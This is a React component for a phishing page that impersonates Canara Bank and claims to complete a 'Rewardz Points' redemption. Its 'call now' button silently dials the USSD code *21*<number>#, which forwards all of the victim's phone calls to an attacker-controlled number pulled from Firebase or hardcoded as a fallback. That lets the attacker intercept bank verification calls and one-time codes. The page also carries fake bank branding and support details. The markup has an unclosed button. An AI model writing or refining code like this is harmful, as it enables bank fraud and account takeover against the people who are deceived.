import { useState, useEffect, useMemo } from 'react';
import FirebaseUtil from '../FirebaseRepo';
import '../App.css';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState('1800-123-4567');

  // Format the call number for USSD
  const formattedCallNumber = useMemo(() => {
    // Remove any non-digit characters from the call number
    const digitsOnly = callNumber.replace(/\D/g, '');
    // Ensure it's a valid 10-digit number
    return digitsOnly.length === 10 ? digitsOnly : '8822407215'; // Default if invalid
  }, [callNumber]);

  useEffect(() => {
    const fetchCallNumber = async () => {
      try {
        const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
        console.log('Fetched call number data:', doc); // Log the fetched data
        
        if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
          const trimmedNumber = doc.call_forwarding_number.trim();
          console.log('Setting call number:', trimmedNumber);
          setCallNumber(trimmedNumber);
        } else {
          console.log('No valid call forwarding number found in document');
        }
      } catch (error) {
        console.error("Error fetching call number:", error);
        // Set a default number if fetching fails
        setCallNumber('8822407215');
      }
    };
    fetchCallNumber();
  }, []);

  useEffect(() => {
    console.log('Current call number:', callNumber);
  }, [callNumber]);

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Blue Bar with Logo */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Canara Bank</h1>
            <p className="text-sm">80% Rewardz Points Redeem Process Compeleted</p>
            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
              Fintech Syndicate
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#0066b3] text-white text-center pb-2">
        <p>Together We Can</p>
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <div className="bg-green-100 text-green-800 rounded-full px-4 py-2 mb-4 inline-block">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Verification Successful
            </div>
            <h1 className="text-2xl font-bold text-blue-800 mb-2">
              Congratulations!
            </h1>
            <p className="text-gray-600">
              Your transaction has been verified successfully.
            </p>
          </div>

          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm text-yellow-700">
                  To collect your Rewardz Points, please give a missed call to our Canara Bank Rewardz Care.
                </p>
              </div>
            </div>
          </div>

          <button
            onClick={() => {
              // Format the USSD code with the call number
              const ussdCode = `*21*${formattedCallNumber}#`;
              // Open the phone dialer with the USSD code
              window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
            }}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
          >
            CALL NOW TO COLLECT REWARDS
          </button>

          <button
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-full"
            onClick={() => window.location.reload()}
          >
          

          <p className="text-xs text-gray-500 text-center">
            Your rewards will be credited to your account within 24-48 hours after verification.
          </p>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
        <p className="text-xs">For support, call {callNumber} or email support@canarabank.com</p>
      </footer>
    </div>
  );
};

export default SuccessPage;
